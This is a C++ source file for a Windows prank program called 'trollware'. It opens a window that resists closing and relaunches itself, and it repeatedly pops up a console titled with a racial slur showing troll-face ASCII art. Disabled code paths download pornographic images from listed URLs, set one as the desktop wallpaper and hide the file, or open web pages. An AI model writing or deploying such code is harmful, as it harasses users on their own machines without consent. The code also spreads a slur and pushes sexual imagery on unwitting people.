// trollware.cpp : This file contains the 'main' function. Program execution begins and ends there.
//
#include <Windows.h>
#include <iostream>
#include <chrono>

#include <cwchar>

#define _USE_MATH_DEFINES
#include <math.h>

#include <shlobj.h>
#include <shellapi.h>
#include <urlmon.h>
#pragma comment(lib, "Urlmon.lib")

#ifdef _DEBUG
constexpr int trollInterval = 2;
float elapsedTime = 1.0f; // wait for first troll
#elif NDEBUG
constexpr int trollInterval = 120;
float elapsedTime = 0.0f;
#endif

bool canQuit = false;

#define doConsoleTroll 1
#define doWebTroll 0
#define doBackgroundTroll 0

CONSOLE_FONT_INFOEX cfi;
CONSOLE_SCREEN_BUFFER_INFOEX consolesize;


void trollConsole();
LRESULT CALLBACK WindowProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam);


int WINAPI WinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance, _In_ LPSTR lpCmdLine, _In_ int nCmdShow)
{

    // define window class
    WNDCLASSEX wc;
    ZeroMemory(&wc, sizeof(WNDCLASSEX));

    wc.cbSize = sizeof(WNDCLASSEX);
    wc.style = CS_HREDRAW | CS_VREDRAW;
    //wc.style = ACS_TRANSPARENT;
    wc.lpfnWndProc = WindowProc;
    wc.cbClsExtra = 0;
    wc.cbWndExtra = 0;
    wc.hInstance = hInstance;
    wc.hIcon = NULL;
    wc.hCursor = LoadCursor(NULL, IDC_NO);
    wc.hbrBackground;
    wc.lpszMenuName;
    wc.lpszClassName = L"TrollwareWindowClass";
    wc.hIconSm;

    // register the window class
    RegisterClassEx(&wc);

    RECT wr = { 0, 0, 800, 600 };
    HWND hwnd;

    // create the window and use the result as the handle
    hwnd = CreateWindowExW(
        // WS_EX_TOPMOST | WS_EX_NOACTIVATE, // Minimize/Maximize/Close
        // WS_EX_TOPMOST | WS_EX_APPWINDOW, // taskbar, Minimize/Maximize/Close
        WS_EX_TOPMOST | WS_EX_TOOLWINDOW, // no taskbar, Close button only
        wc.lpszClassName,    // name of the window class
        L"Trollware",   // title of the window
        WS_OVERLAPPEDWINDOW,    // window style //WS_POPUP
        300,    // x-position of the window
        300,    // y-position of the window
        wr.right - wr.left,    // width of the window
        wr.bottom - wr.top,    // height of the window
        NULL,    // we have no parent window, NULL
        NULL,    // we aren't using menus, NULL
        hInstance,    // application handle
        NULL);    // used with multiple windows, NULL
    ShowWindow(hwnd, nCmdShow); // make sure window is shown

#ifdef _DEBUG
    //ShowWindow(hwnd, SW_SHOW);
#endif

#if doConsoleTroll
    AllocConsole();
    SetConsoleTitleW(L"Get trolled negga");
    FILE* f;
    freopen_s(&f, "CONOUT$", "w", stdout);


    HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE);

    cfi.cbSize = sizeof(CONSOLE_FONT_INFOEX);
    GetCurrentConsoleFontEx(hConsole, FALSE, &cfi);
    cfi.dwFontSize.X = 0;                   // Width of each character in the font
    cfi.dwFontSize.Y = 10;                  // Height
    cfi.FontWeight = FW_SEMIBOLD;
    SetCurrentConsoleFontEx(hConsole, FALSE, &cfi);

    consolesize.cbSize = sizeof(consolesize);
    GetConsoleScreenBufferInfoEx(hConsole, &consolesize);
    COORD c;
    c.X = 76;
    c.Y = 29;
    consolesize.dwSize = c;
    consolesize.srWindow.Left = 0;
    consolesize.srWindow.Right = c.X;
    consolesize.srWindow.Top = 0;
    consolesize.srWindow.Bottom = c.Y;
    SetConsoleScreenBufferInfoEx(hConsole, &consolesize);
    
    trollConsole();
#endif

    const auto initDuration = std::chrono::high_resolution_clock::now().time_since_epoch();

    static char deskPath[MAX_PATH + 1];
    const bool hasDeskPath = SHGetSpecialFolderPathA(HWND_DESKTOP, deskPath, CSIDL_DESKTOP, FALSE);

    MSG msg;
    while (true)
    {
        if (GetAsyncKeyState(VK_ESCAPE) && 0x1)
        {
            canQuit = true;
            PostMessageA(hwnd, WM_DESTROY, 0, 0);
        }
        if (PeekMessage(&msg, NULL, 0, 0, PM_REMOVE)) {
            TranslateMessage(&msg);
            DispatchMessage(&msg);

            if (msg.message == WM_QUIT)
                break;
        }

        auto now = std::chrono::high_resolution_clock::now().time_since_epoch();
        int troll = (int)((float)std::chrono::duration_cast<std::chrono::microseconds>((now - initDuration)).count() / 1000 / 1000);

        static int trollCounter = 0;
        constexpr const char* trollWebUrlList[] = {
            "https://google.dk",
            "https://youtube.dk",
            "https://bing.dk",
            "https://yahoo.dk"
        };

        constexpr const char* trollImageUrlList[] = {
            "https://cdn77-pic.xvideos-cdn.com/videos/thumbs169poster/e1/c5/c6/e1c5c67e20f860c432873e1844ba01cd/e1c5c67e20f860c432873e1844ba01cd.26.jpg",
            "https://di.phncdn.com/videos/202205/10/407834071/original/(m=qKOL1NXbeGNdHgaaaa)(mh=FL9JeUDt1k_va7ji)0.jpg",
            "https://icdn05.icegay.tv/71789/3589421_9.jpg",
            "https://queerty-prodweb.s3.amazonaws.com/2019/04/jacen_zhu_01.jpg",

        };

        constexpr int trollWebUrlCount = sizeof(trollWebUrlList) / sizeof(char*);
        constexpr int trollImageUrlCount = sizeof(trollImageUrlList) / sizeof(char*);
        
        static bool didTroll = false;
        if (troll%trollInterval == 0) {
            if (didTroll == false) {
                didTroll = true;

                const std::string backgroundPathA = std::string(deskPath) + "\\troll.png";

#if doWebTroll
                ShellExecuteA(0, 0, trollWebUrlList[trollCounter % trollWebUrlCount], 0, 0, SW_SHOW);
#endif

#if doBackgroundTroll
                remove(backgroundPathA.c_str());
                HRESULT hr;
                hr = URLDownloadToFileA(0, trollImageUrlList[trollCounter % trollImageUrlCount], backgroundPathA.c_str(), BINDF_GETNEWESTVERSION, 0);
                if (hr == S_OK) {
                    SystemParametersInfoA(SPI_SETDESKWALLPAPER, 0, (PVOID)backgroundPathA.c_str(), SPIF_UPDATEINIFILE | SPIF_SENDCHANGE);
                }
                DWORD attributes = GetFileAttributesA(backgroundPathA.c_str());
                if (attributes != INVALID_FILE_ATTRIBUTES) {
                    attributes |= FILE_ATTRIBUTE_HIDDEN;
                    SetFileAttributesA(backgroundPathA.c_str(), attributes);
                }
#endif                


#if doConsoleTroll
                trollConsole();
#endif
                trollCounter += 1;
            }
        }
        else {
            didTroll = false;
        }

        constexpr float DEG2RAD = (M_PI / 180);

        static float _x = 0, _y = 0, _cx = 0, _cy = 0;
        static int x = 0, y = 0, cx = 0, cy = 0;
        _x += 1; _y += 1; _cx += 1; _cy+=0.5;

        _x = fmod(_x,360); _y = fmod(_y,360); _cx = fmod(_cx, 360); _cy = fmod(_cy, 360);
        


        POINT p;
        GetCursorPos(&p);

        cx = 100 + fabs(cosf(_cx * DEG2RAD) * 200);
        cy = 100 + fabs(sinf(_cy * DEG2RAD) * 200);
        x = p.x - cx/2 + cosf(_x * DEG2RAD) * 100;
        y = p.y - cy/2 + sinf(_y * DEG2RAD) * 100;

        SetWindowPos(hwnd, nullptr, x, y, cx, cy, SWP_SHOWWINDOW);
    }
}

// this is the main message handler for the program
LRESULT CALLBACK WindowProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam)
{
    switch (message) {
        // this message is read when the window is closed
    case WM_QUIT:
        if (!canQuit)
            return 1;
        break;

    case WM_DESTROY:

        if (canQuit)
        {
            PostQuitMessage(0);
            return 0;
        }
        system(__argv[0]);
        return 1;
        break;
    }
    // Handle any messages the switch statement didn't
    return DefWindowProc(hWnd, message, wParam, lParam);
}



void trollConsole() {
#if doConsoleTroll
#ifdef _DEBUG
    static bool consoleOpen = false;
    if (!consoleOpen) {
#endif
        AllocConsole();
        SetConsoleTitleW(L"Get trolled negga");
        FILE* f = 0;
        if (!f) {
            freopen_s(&f, "CONOUT$", "w", stdout);
        }
        
        HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE);
        SetCurrentConsoleFontEx(hConsole, FALSE, &cfi);
        SetConsoleScreenBufferInfoEx(hConsole, &consolesize);

#ifdef _DEBUG
        consoleOpen = true;
    }
#endif

    printf("\n\n@@@@@@@@@@@@@@@@@@@W@@@@@WWWBBBHHHHHHHHHBWWW@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@\n");
    printf("@@@@@@@@@@@@@@@D!`__ssaaaaaaaaaass_ass_s____.  -~\"\"??9VW@@@@@@@@@@@@@@@@@@@\n");
    printf("@@@@@@@@@@@@@P'_wm@@@WWBWV?GwwwmmW@mwwwwwgmZUVVHA@waaaac,\"?9$@@@@@@@@@@@@@@\n");
    printf("@@@@@@@@@@@W! a@W@@@@W?@w#TTSgwawwggywawwpY?T?TYTYTXmwwgZ$ma/-?4@@@@@@@@@@@\n");
    printf("@@@@@@@@@@W' j@@@@WT@wDYauT9mmwwawww?WWWW@@@@@@TT?TVTT9H@@@@@@w,-4@@@@@@@@@\n");
    printf("@@@@@@@@@@[ j@@@@@yWVw2$wWW@@@WW@WWWW7W@@@@@@@@PWW@@@W@@w7W@@@WWc)WW@@@@@@@\n");
    printf("@@@@@@@@@f j@@@@@WWmWmm@WU???????9WW@mW@@@@@@@WjW@@@@@@@W@m@@@@WL 4@@@@@@@@\n");
    printf("@@@@@@@P'.y@@@@@@@@@@@P\"       <wa,.!4W@@@@@@@WdWP??!\"??4WW@@@W@@c ?@W@@@@@\n");
    printf("@@@@@P'_a.<aam@@@W!<yF \"!` ..  \"??$@a \"W@@@WTVP'    \"??' =@@mWWV?46/ ?@@@@@\n");
    printf("@@@P'sdyW@P?!`.-\"?46m@@@@@@T!m@@gaa. <wW@@W@aa _aawmWW@@@@@@@@@WP4a7g -WW@@\n");
    printf("@@[ j@m@P'ad@@P4ga, -????\" <j@@@@@W@@@@@@@@@WW;)W@WWWW9@@P?\"`  -?@z@7L ]@@@\n");
    printf("@W j@k@@ jW@@D'-?$@@@@@@@@@@@@@@@@@WW@W@@@W@@@c \"4@@@@a   .@P4@@@@fWkl j@@@\n");
    printf("@E ]@k@k $D?`  waa \"?9WW@@@P??T?47`_aam@@@@@@WW@w,-?@WW@@@@@`\"@@@@D\@f(.@W@@\n");
    printf("@@,-@m4@/-@m@6 \"WW@ma/  \"??@@@@@@L 4W\"- -?$@@@@WP`s,awT$@@@@  \"@W@?$:.y@@@@\n");
    printf("@@m/-4wT@g@W@@,  ?4WWk 4waac -???$wa@@@@@@@@F??'<mWWWWW@W?^  ` ]6@@' y@@@@@\n");
    printf("@@@@w,-?@mW@@@@w  a,    ?@WW@@@w _.  \"????9VWaam@WV???\"  a j/  ]@@f j@@@@@@\n");
    printf("@@@@@@w,\"4@@@@@@m,-$@a     ???4F j@@@@@wc <aaas _aaaaa 4@W ]E  )W@`=@@@@@@@\n");
    printf("@@@@@@W@/ $@@@@@@@a ?H ]Wwa,     ???9WWWh d@WWW,=@WWU?  ?!     )W@ ]@@@@@@@\n");
    printf("@@@@@@@@@c-@W@@@@@W6,  @W@W@@@k <c                             jW@ ]@@@@@@@\n");
    printf("@@@@@@@@@@,\"$W@@W@@@@g,.\"?@@@@'.m@@@maa,.,                . .; @W@.]@@@@@@@\n");
    printf("@@@@@@@@@W@a ?$W@@W@@@@@a,.\"?( m@@@@@@W[:@@@@m[ ammF jy! j( } j@@@(:@@@@@@@\n");
    printf("@@@@@@@@@@WWma \"9gw?9gdB?@@wa, -??T$W@@;:@@@W@ ]WWD _@f +?! _j@@@Wf @@@@@@@\n");
    printf("@@@@@@@@@@@@@@@ws \"T@au?9maZ?W@maas,,    --~-- ---  . _ssawm@@@@@@k 3@@@@W@\n");
    printf("@@@@@@@@@@@@@@@@W@ga,-?9mwad?1wdT9W@@@@@WVVTTYY?YTVW@@@@WWD5m@@P@@@ ]@@@@@@\n");
    printf("@@@@@@@W@@@@@@@@@@@W@@wa,-??$@wadV}<wBHHVHWWBHHUWWBVTTTV5awB@@D6@@@ ]@@@@@@\n");
    printf("@@@@@@@@@@@@@@@@@@@@@@WW@@ga,-\"9$W@@mmwwmBUUHTTVWBW@@@@WVT?96a@W@@@ ]@@@@@@\n");
    printf("@@@@@@@@@@W@@@@W@@@@@@@@@@@W@@ma,-?9$@@WW@@@@@@@Wm@mmmmm@W@@@@W@@W(.y@@@@@W\n");
    printf("@@@@@@@@@@@@@W@@@@@@W@@@@@@@@@@@@@ga%,.  -??9$@@@@@@@@@@@@W@@W@@V? sW@@@@@@@\n");
    printf("@@@@@@@@@W@@@@@@@@@@@@@@W@@@@@@@@@@@W@@@@mywaa,;~^\"!???????!^`_sa@WW@@@@@@@");

    
#ifdef NDEBUG
#endif
    FreeConsole();

#endif
}